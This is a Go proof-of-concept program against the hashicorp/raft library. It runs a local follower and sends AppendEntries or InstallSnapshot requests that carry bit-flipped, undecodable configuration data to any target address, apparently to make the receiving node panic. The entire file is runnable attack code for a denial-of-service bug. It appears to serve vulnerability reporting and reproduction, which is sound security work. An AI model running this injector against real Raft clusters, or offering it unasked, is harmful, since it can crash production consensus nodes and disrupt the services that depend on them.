package main

import (
	"bytes"
	"fmt"
	"io"
	"log"
	"os"
	"os/signal"
	"strconv"
	"syscall"
	"time"

	"github.com/hashicorp/go-msgpack/v2/codec"
	raft "github.com/hashicorp/raft"
)

func main() {
	if len(os.Args) < 2 {
		usage()
		os.Exit(2)
	}

	switch os.Args[1] {
	case "follower":
		addr := "127.0.0.1:13000"
		if len(os.Args) > 2 {
			addr = os.Args[2]
		}
		if err := runFollower(addr); err != nil {
			log.Fatalf("follower failed: %v", err)
		}
	case "inject-append":
		if len(os.Args) < 3 {
			log.Fatal("usage: inject-append <target-host:port>")
		}
		if err := injectAppendMalformedConfiguration(os.Args[2]); err != nil {
			log.Fatalf("inject-append failed: %v", err)
		}
	case "inject-snapshot":
		if len(os.Args) < 3 {
			log.Fatal("usage: inject-snapshot <target-host:port>")
		}
		if err := injectSnapshotMalformedConfiguration(os.Args[2]); err != nil {
			log.Fatalf("inject-snapshot failed: %v", err)
		}
	default:
		usage()
		os.Exit(2)
	}
}

func usage() {
	fmt.Println("Standalone malformed-configuration panic PoC")
	fmt.Println()
	fmt.Println("Commands:")
	fmt.Println("  follower [addr]           Start a real Raft follower process")
	fmt.Println("  inject-append <target>    Send AppendEntries with bit-flipped config bytes")
	fmt.Println("  inject-snapshot <target>  Send InstallSnapshot with bit-flipped config bytes")
}

type noopFSM struct{}

func (f *noopFSM) Apply(*raft.Log) interface{} { return nil }

func (f *noopFSM) Snapshot() (raft.FSMSnapshot, error) { return &noopSnapshot{}, nil }

func (f *noopFSM) Restore(r io.ReadCloser) error {
	defer func() { _ = r.Close() }()
	_, err := io.Copy(io.Discard, r)
	return err
}

type noopSnapshot struct{}

func (s *noopSnapshot) Persist(sink raft.SnapshotSink) error { return sink.Close() }

func (s *noopSnapshot) Release() {}

func runFollower(addr string) error {
	trans, err := raft.NewTCPTransport(addr, nil, 3, 10*time.Second, os.Stderr)
	if err != nil {
		return fmt.Errorf("create follower transport: %w", err)
	}
	defer trans.Close()

	conf := raft.DefaultConfig()
	conf.LocalID = raft.ServerID(addr)
	conf.HeartbeatTimeout = 1 * time.Second
	conf.ElectionTimeout = 1 * time.Second

	logStore := raft.NewInmemStore()
	stableStore := raft.NewInmemStore()
	snapshotStore := raft.NewInmemSnapshotStore()

	cfg := raft.Configuration{
		Servers: []raft.Server{
			{ID: conf.LocalID, Address: trans.LocalAddr(), Suffrage: raft.Voter},
		},
	}
	if err := raft.BootstrapCluster(conf, logStore, stableStore, snapshotStore, trans, cfg); err != nil {
		return fmt.Errorf("bootstrap follower cluster: %w", err)
	}

	node, err := raft.NewRaft(conf, &noopFSM{}, logStore, stableStore, snapshotStore, trans)
	if err != nil {
		return fmt.Errorf("start follower raft: %w", err)
	}

	log.Printf("follower running pid=%d addr=%s", os.Getpid(), trans.LocalAddr())
	log.Printf("waiting for inject-* command from another process")

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	<-sigCh

	log.Printf("shutting down follower")
	return node.Shutdown().Error()
}

func injectAppendMalformedConfiguration(target string) error {
	trans, err := raft.NewTCPTransport("127.0.0.1:0", nil, 1, 5*time.Second, os.Stderr)
	if err != nil {
		return fmt.Errorf("create injector transport: %w", err)
	}
	defer trans.Close()

	corrupted, idx, bit, decErr := findSingleBitCorruption()
	log.Printf("using single-bit corrupted config payload: byte_index=%d bit=%d decode_err=%v", idx, bit, decErr)

	proto := raft.DefaultConfig().ProtocolVersion
	localID := raft.ServerID("injector")
	localAddr := trans.LocalAddr()
	encodedLocal := trans.EncodePeer(localID, localAddr)

	req := raft.AppendEntriesRequest{
		RPCHeader: raft.RPCHeader{
			ProtocolVersion: proto,
			ID:              []byte(localID),
			Addr:            encodedLocal,
		},
		Term:         2,
		Leader:       encodedLocal,
		PrevLogEntry: 0,
		PrevLogTerm:  0,
		Entries: []*raft.Log{
			{
				Index: 1,
				Term:  2,
				Type:  raft.LogConfiguration,
				Data:  corrupted,
			},
		},
	}

	var resp raft.AppendEntriesResponse
	err = trans.AppendEntries(localID, raft.ServerAddress(target), &req, &resp)
	log.Printf("append rpc result: err=%v success=%v term=%d", err, resp.Success, resp.Term)
	return err
}

func injectSnapshotMalformedConfiguration(target string) error {
	trans, err := raft.NewTCPTransport("127.0.0.1:0", nil, 1, 5*time.Second, os.Stderr)
	if err != nil {
		return fmt.Errorf("create injector transport: %w", err)
	}
	defer trans.Close()

	corrupted, idx, bit, decErr := findSingleBitCorruption()
	log.Printf("using single-bit corrupted config payload: byte_index=%d bit=%d decode_err=%v", idx, bit, decErr)

	proto := raft.DefaultConfig().ProtocolVersion
	localID := raft.ServerID("injector")
	localAddr := trans.LocalAddr()
	encodedLocal := trans.EncodePeer(localID, localAddr)

	req := raft.InstallSnapshotRequest{
		RPCHeader: raft.RPCHeader{
			ProtocolVersion: proto,
			ID:              []byte(localID),
			Addr:            encodedLocal,
		},
		SnapshotVersion:    raft.SnapshotVersionMax,
		Term:               2,
		Leader:             encodedLocal,
		LastLogIndex:       1,
		LastLogTerm:        1,
		Configuration:      corrupted,
		ConfigurationIndex: 1,
		Size:               0,
	}

	var resp raft.InstallSnapshotResponse
	err = trans.InstallSnapshot(localID, raft.ServerAddress(target), &req, &resp, bytes.NewReader(nil))
	log.Printf("install-snapshot rpc result: err=%v success=%v term=%d", err, resp.Success, resp.Term)
	return err
}

func findSingleBitCorruption() ([]byte, int, int, error) {
	base := raft.EncodeConfiguration(raft.Configuration{
		Servers: []raft.Server{
			{
				Suffrage: raft.Voter,
				ID:       raft.ServerID("node1"),
				Address:  raft.ServerAddress("127.0.0.1:13000"),
			},
		},
	})

	for i := 0; i < len(base); i++ {
		for bit := 0; bit < 8; bit++ {
			candidate := append([]byte(nil), base...)
			candidate[i] ^= byte(1 << bit)
			err := decodeConfigurationForValidation(candidate)
			if err != nil {
				return candidate, i, bit, err
			}
		}
	}

	// Fallback: deterministic invalid payload if all single-bit flips happen to decode.
	return []byte("not-msgpack-configuration"), -1, -1, fmt.Errorf("no single-bit corruption caused decode failure")
}

func decodeConfigurationForValidation(buf []byte) error {
	var out raft.Configuration
	h := &codec.MsgpackHandle{}
	dec := codec.NewDecoderBytes(buf, h)
	return dec.Decode(&out)
}

func init() {
	log.SetFlags(log.LstdFlags | log.Lmicroseconds)
	log.SetPrefix("poc ")
	if v := os.Getenv("POC_LOG_STDOUT_ONLY"); v != "" {
		onlyStdout, _ := strconv.ParseBool(v)
		if onlyStdout {
			log.SetOutput(os.Stdout)
		}
	}
}
